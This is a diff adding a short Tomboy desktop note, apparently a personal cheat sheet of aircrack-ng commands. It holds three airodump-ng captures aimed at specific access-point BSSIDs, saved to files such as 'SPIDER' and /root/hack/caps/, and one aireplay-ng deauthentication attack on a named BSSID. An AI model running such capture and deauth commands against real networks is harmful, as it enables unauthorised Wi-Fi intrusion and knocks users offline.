@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<note version="0.3" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy"><title>airodump</title><text xml:space="preserve"><note-content version="0.1" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size">airodump
+
+airodump-ng -c 8 -d 3c:84:6a:97:5d:e2 -w SPIDER wlp5s0
+
+airodump-ng -c 11 -d 98:DE:D0:A9:67:20 -w /root/hack/caps/Okt26-27 wlp5s0
+
+aireplay-ng -0 2 -a B8:A3:86:B8:18:0A -c 00:00:00:00:00:00 wlp5s0
+
+airodump-ng -c 1 -d f8:f0:82:1c:4b:0e -w YURA wlp5s0</note-content>
+</text><last-change-date>2022-12-30T05:53:41,838282Z</last-change-date><last-metadata-change-date>2022-12-30T05:53:41,838282Z</last-metadata-change-date><create-date>2022-12-30T05:53:39,379132Z</create-date><cursor-position>91</cursor-position><selection-bound-position>-1</selection-bound-position><width>705</width><height>817</height><tags><tag>system:notebook:wi-fi</tag></tags></note>
+
